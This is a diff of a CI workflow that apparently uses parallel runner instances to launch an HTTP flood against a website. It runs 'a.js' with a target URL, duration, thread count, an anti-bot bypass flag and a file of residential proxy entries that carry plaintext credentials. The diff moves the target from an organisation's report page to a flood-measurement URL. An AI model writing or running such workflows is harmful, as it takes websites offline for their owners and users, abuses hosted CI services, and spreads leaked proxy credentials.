@@ -13,7 +13,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4]
+        instance: [1, 2]
     
     steps:
     - name: Checkout code
@@ -32,18 +32,13 @@ jobs:
     - name: Create proxy file
       run: |
         cat > 11.txt << 'EOF'
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
+        proxy.global.ip2up.com:12348:KBpiET9_88_0_0_829566662_0_0:G1nk2M2
+        proxy.global.ip2up.com:12348:KBpiET9_88_0_0_829566662_0_0:G1nk2M2
+        proxy.global.ip2up.com:12348:KBpiET9_88_0_0_829566662_0_0:G1nk2M2
+        proxy.global.ip2up.com:12348:KBpiET9_88_0_0_829566662_0_0:G1nk2M2
+
         EOF
 
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
-        node a.js GET https://www.investigations.org/report/jeffrey-lane-werdesheim 700 4 1 11.txt --full --auth --debug 
+        node a.js GET https://rate-limit-1.dstatbot.win/gYJ5QvyT 700 4 1 11.txt --bfm --auth --debug 
